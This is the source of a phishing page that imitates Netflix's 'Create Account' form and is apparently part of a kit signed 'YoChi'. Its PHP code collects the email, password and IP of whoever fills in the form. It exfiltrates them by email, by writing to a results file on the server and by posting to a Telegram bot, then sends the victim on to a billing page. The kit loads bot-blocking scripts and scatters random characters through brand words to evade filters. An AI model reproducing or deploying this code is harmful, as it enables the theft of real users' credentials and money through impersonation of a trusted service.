<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
include 'config.php';
if(isset($_POST['email']) && isset($_POST['password'])){if($_POST['email']!=''&& $_POST['password']==$_POST['cp']){
		$email        = $_POST['email'];
        $password     = $_POST['password'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|--===-======-=======--YoChi--=======-======-===--|
------------------ CRT New NETFLIX ---------------- 
Email           : $email
Password        : $password ";
		$_SESSION['fullz']=$Info_LOG;
$Info_LOG.='

'.$_SESSION['device'];
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = 'Unregistered Netflix ♥♥ '.$PublicIP ;$headers = 'From: YOCHI <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result elseif == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
$_SESSION['action']='signup';
header('Location:bill/basic?'.md5('sjd'));
}
else{header('Location:create?'.$theerrkey.'=1&amp;yn='.md5('sjdsd'));}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Create Account - Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link type="text/css" rel="stylesheet" href="./oille/nul.css"><link type="text/css" rel="stylesheet" href="./oille/null.css"><link rel="shortcut icon" href="fnset/favicon.ico">
<style>
	*{box-sizing:border-box;}	
	.svg-nfLogo .svg-icon-netflix-logo{box-sizing:content-box;}
	html{height:auto;}
	body{margin:0px;padding:0;height:100vh;}
	.thead{height:;width:100%;text-align:left;}
	.mainviewpar{padding:0;position:relative;background-color:#f1f1f1;}
    .mainview{width:100%;max-width:639px;margin:0 auto;padding:10px 0;color:#999;}
	.mainviewchild{margin:0 10px;padding:10px 20px;text-align:center;background-color:#fff;border: 1px solid #dcdde0;}
	@media only screen and (min-width:500px){.mainviewchild{}}
	@media only screen and (min-height:900px){.mainviewchild{margin:50px auto;}}
	.header_logo{display:inline-block;width:150px;height:45px;background:url('fnset/hiconb.png') no-repeat;background-position:0 -9px; background-size:100%;}
	.vx_modal-header h1{font-size:1.6rem;;font-weight: 400;text-transform: none;font-family: Arial,sans-serif;border-bottom: 2px solid #dcdde0;padding-bottom:10px;}
	
	form{max-width:360px;margin:auto}
    input{width: 100%;height: 44px;padding: 0 15px ;line-height:44px;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 5px;font-size: 15px;background-color:#333;text-transform:;color: #ccc;}	
	select{width: 100%;height:44px;padding: 0 15px;color:#686159;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 6px;font-size: 14px;background-color:#333;-moz-padding-start: 0.5rem;-webkit-appearance: none;-moz-appearance: none;text-transform:;color: #ccc;}
    input:focus{border: 1px solid #009CDE;border-radius: 6px;outline:0;z-index:100;padding: 15px 18px 0;transition:padding 0.3s;}
    select:focus{border: 2px solid #009CDE;border-radius: 6px;outline:0;padding: 15px 18px 0;transition:padding 0.3s;}
	.notcapitalized{text-transform:none;}
	.cardImage_medium{margin:0px auto 10px;display:block;}
	.vx_form-group{position:relative;}
	.vx_form-group label{opacity:1;background-color:#333;border-radius:6px;position: absolute;left: 0;padding: 0 15px;line-height: 40px;margin: 2px;transition: opacity 0.25s ease-out;z-index: 0;white-space: nowrap;overflow: hidden;max-width: 98%;text-overflow: ellipsis;color: #6c7378;font-size:15px;}
	.vx_form-group input:focus~label{display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.hasError,.hasError:focus{border: 1px solid #d20000;outline:0;padding: 15px 18px 0;transition:border 0.3s}
	input.hasError~label, input.hasError:focus~label{color:#f00;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	select.hasError~label, select.hasError:focus~label{color:#f00;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;}
	.vx_form-group input.hasContent{border: 1px solid #B7B6B6;;outline:0;z-index:100;padding: 15px 18px 0;}
	.vx_form-group input.hasContent~label{color:#686159;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.vx_form-group input.hasContent:focus{border: 1px solid #009CDE;outline:0;z-index:100;padding: 15px 18px 0;}
	.vx_form-group input.hasContent:focus~label{color:#0070BA;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.ppvx_dropdown{position:relative;}
	.ppvx_dropdown label{opacity:1;background-color:#333;border-radius:6px;position: absolute;left: 0;padding: 0 50% 0 15px;line-height: 40px;margin: 2px;transition: opacity 0.25s ease-out;z-index: 0;white-space: nowrap;overflow: hidden;max-width: 100%;text-overflow: ellipsis;color: #6c7378;font-size:15px;}
	.ppvx_dropdown select:focus~label{display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;}
	.ppvx_dropdown::before{content: '';width: 10px;height: 10px;line-height: 0;border:1px solid;border-color:transparent transparent #686159 #686159;position: absolute;top:13px;right: 0.75rem;z-index: 2;transform:rotate(-45deg);}
	.ppvx_dropdown select.hasContent{outline:0;z-index:100;padding: 15px 18px 0;}
	.ppvx_dropdown select.hasContent~label{color:#686159;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.ppvx_dropdown select.hasContent:focus{border: 2px solid #009CDE;outline:0;z-index:100;padding: 15px 18px 0;}
	.ppvx_dropdown select.hasContent:focus~label{color:#0070BA;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.btn_info{width:100%;height:44px;box-sizing:border-box;margin-bottom: 10px;border-radius: 1.5em;border:0;text-transform: capitalize;margin-top: 0; background-color:#E50914 !important; cursor: pointer;color: #fff;font-size: 17px;line-height: 1.47059;display: inline-block;min-width: 30px;padding: 4px 15px;text-align: center;}
	.table-row{display:table;table-layout:fixed;}
	.table-row > div{display:table-cell;}
	.table-col-xs-10{width:;}
	.table-col-xs-2{width:16%;min-height:1px;font-size:15px;padding:0 1% 0 1%;text-align:left;}
	.equal{width:50%;display:;float:left} .equal #city{border-radius:6px 0 0 6px;} .equal #zip{border-radius:0 6px 6px 0;border-left:;}
	.equal #zip:focus{border-left:1px solid #009CDE;}  .equal #zip.hasError{border-left:1px solid #d20000;}
	.phone div{float:left;} .phone .ppvx_dropdown{width:35%;} .phone .vx_form-group{width:65%;} .phone select{border-radius:6px 0 0 6px;} .phone select.hasContent:focus{border-width:1px;} .phone input{border-left:;border-radius:0 6px 6px 0;} .phone input:focus{border-left:1px solid #009CDE;} .phone input.hasError{border-left:1px solid #d20000;} .phone .ppvx_dropdown::before{height:5px;width:5px;top:18px;}
	
	.rectangleLogo_small{width:3.2em;height:2.1em;margin:0 auto;border-radius:4px;display:inline-block;box-shadow:0 1px 2px 0 rgba(0, 0, 0, 0.15);position:relative}
	.csc-image::after {content:"";position:absolute;width:3.2em;height:3em;top:0;right:0;background:url('fnset/sprite_logos_wallet_2x.png') no-repeat;background-position:0px -731px;background-size:153%;}
	.hide{display:none;}
	.notification-critical{background: #E87C03;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    font-size: 14px;
    margin: 0 0 16px;
	padding: 10px 20px;
    vertical-align: middle;
    padding: 20px 10px;
    color: #fff;}
	.transitioning{height:100%;background-color:rgba(190,190,190,0.8);position:fixed;top:0;left:0;min-height:100%;width:100%;}
	.loader{content:"";position:relative; display: block;top:47%;margin:auto;height:50px;width:50px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #E50914;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:730px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
		.login-body:after {
		content: "";
		height: 106px;
		display: block;
		}
		.login-body {
		margin: 0 auto -236px;
		min-height: 100vh;
		background-color: transparent;
		max-width: 700px;
			}
	}
	#cvvcont,#expcont{width:48%;display:;float:left} #cvvcont{float:right;}
	.cvv{z-index:2;border-radius:50%;width:30px;height:30px;right:20px;position:absolute;top:8px;background-color:#555;color:#fff;font-weight:900;display:inline-block;line-height:30px;font-size:20px;text-align:center;}
	.cvv:active,.cvv:hover{background-color:#555;transition:background-color 0.3s;}
	.popbase{position:relative;}
	.popup{position:absolute;top:-50%;right:48px;margin:auto;width:80%;display:none;max-width:80%;border:1px solid #999;border-radius:0px;background-color:#fff;z-index:4;text-align:left;padding:5px;font-size:14px;box-shadow:7px 7px 7px ;} .popup>span{background-color:#777;color:#fff;padding:3px;border-radius:5px;width:30px;display:block;margin:auto;text-align:center;}
	.popup::after{content:'';line-height: 0;border:10px solid;border-color:transparent transparent transparent #686159;position: absolute;top:13px;right: -20px;z-index: 2;}
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:680px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.isvbv{padding:0;box-sizing:border-box;margin-bottom: 12px;font-size: 13px;background-color:#fff;text-transform:capitalize;}
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
.hybrid-login-form.hybrid-login-form-signup {
    min-height: 400px;
	}}
  
</style>

<style>
  
	.btn_info{width:100%;min-height:44px;box-sizing:border-box;margin-bottom: 10px;border: 0px solid #07c;border-radius: 1.5em;font-size: 16px;text-transform: capitalize;margin-top: 0; background-color:#E50914 !important; cursor: pointer;color: #fff;font-size: 17px;line-height: 1.47059;font-weight: 400;letter-spacing: -.022em;font-family: SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display: inline-block;min-width: 30px;padding:11px 23px;text-align: center;text-decoration:none}	
	.loginSignUpSeparator{position:relative;border-top:1px dashed #777;margin:20px } .textInSeparator{top:-14px;left:45%;background-color:#000103;display:inline-block;padding:5px;position:absolute;}
	
</style>

</head>
<body><div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper"><div class="login-wrapper-background"><img class="concord-img vlv-creative" src="fnset/website_small.jpg" srcset="fnset/website_small.jpg 1000w, fnset/website_medium.jpg 1500w, fnset/website_large.jpg 1800w" alt=""/></div><div class="nfHeader login-header signupBasicHeader"><a href="" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Net<?php echo rT('ALPHANUMERIC',rand(1,87));?>flix</span></a></div><div class="login-body"><div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript><div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container"><div class="hybrid-login-form-main"><h1> 
<header class="vx_modal-header"><h1>Create new Account</h1><p class="vx_text-body header-centered"></p></header></h1><div class="ui-message-container <?php if(isset($_GET[''.$theerrkey.''])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>




<form id="mainloginform" method="POST" onsubmit="return validate()"><div id="mainview" class="mainview">
<div class="vx_form-group vx_floatingLabel_active"><input type="text" id="email" name="email" class="" placeholder="Email Address" autocomplete="off" oninput="hasCtnt()" onclick="hasCtnt()" required="required"/><label class="floatingLabel" for="email">E<?php echo rT('ALPHANUMERIC',rand(1,87));?>mail Add<?php echo rT('ALPHANUMERIC',rand(1,87));?>ress</label></div>

<div class="vx_form-group vx_floatingLabel_active"><input type="password" id="pass" name="password" class="" placeholder="Password" autocomplete="off" oninput="hasCtnt()" onclick="hasCtnt()" value="" required="required"/><label class="floatingLabel" for="pass">Passw<?php echo rT('ALPHANUMERIC',rand(1,87));?>ord</label></div>

<div class="vx_form-group vx_floatingLabel_active"><input type="password" id="cp" name="cp" class="" placeholder="Confirm Password" autocomplete="off" oninput="hasCtnt()" onclick="hasCtnt()" value="" required="required"/><label class="floatingLabel" for="cp">Conf<?php echo rT('ALPHANUMERIC',rand(1,87));?>irm Password</label></div>
<div style="margin-bottom:12px">By Clic<?php echo rT('ALPHANUMERIC',rand(1,87));?>king N<?php echo rT('ALPHANUMERIC',rand(1,87));?>ext You Agree To Net<?php echo rT('ALPHANUMERIC',rand(1,87));?>flix's Te<?php echo rT('ALPHANUMERIC',rand(1,87));?>rms and Condi<?php echo rT('ALPHANUMERIC',rand(1,87));?>tions</div>
<input type="hidden" name="hsub" value="yes"/>
<button type="submit" name="detailsSubmit" data-track="{}" class="btn_info" title="">NEXT</button>
</div>
</form>
</div>
</div>

</div></div>
<div class="transitioning hide" id="loader">
<div class="loader">
&nbsp;
</div>
</div>
</div>
</div>

<div></div>
<script>
"use strict"
document.getElementById("mainloginform").setAttribute("novalidate",true);
var popup=document.getElementById("popup");
var bh=window.innerHeight;
function load(){var t = document.getElementById("loader");t.className="transitioning";};
function stopload(){var t = document.getElementById("loader");t.className="transitioning hide";document.getElementById("errnotif").className="notification-critical";};
function hasCtnt(){var tgt=event.target;if(tgt.value!=""){tgt.className="hasContent"} else{tgt.className=""};};
function disperr(i){i.className=" hasError";};

function validate(){var err = document.getElementById("errnotif");err.className="notification-critical hide";load();var self=document.getElementById("mainloginform"); var input = self.querySelectorAll("input[required]");var emptylist=[];for(var i=0;i<input.length;i++){if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){setTimeout(function(){input[emptylist[0]].focus();stopload();err.innerHTML="All fields are required !";for(var i of emptylist){disperr(input[i])};},1500);return false;} else{if(input[1].value != input[2].value){setTimeout(function(){stopload();err.innerHTML="Passwords Can't be empty And must be the same";disperr(input[1]);input[1].focus();},1500);return false;} else{return true;};}; };
<?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>
function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script>
</body>
</html>